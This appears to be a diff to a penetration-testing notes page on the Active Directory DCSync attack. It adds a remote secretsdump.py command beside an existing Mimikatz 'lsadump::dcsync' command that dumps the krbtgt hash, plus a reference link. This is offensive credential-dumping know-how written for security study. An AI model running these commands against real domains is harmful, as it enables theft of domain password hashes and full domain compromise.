@@ -18,10 +18,15 @@ Check who has these permissions using `powerview`:
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
 ```
 
-### Exploit
+### Exploit Locally
 
 ```bash
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+```
+
+### Exploit Remotely
+```bash
+secretsdump.py -just-dc <user>:<password>@<ipaddress>
 ```
 
 ### Persistence
@@ -46,4 +51,6 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 * AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
 \*\*\*\*[**More information about DCSync in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)\*\*\*\*
+
+\*\*\*\*[**More information about DCSync**](https://yojimbosecurity.ninja/dcsync/)\*\*\*\*
 
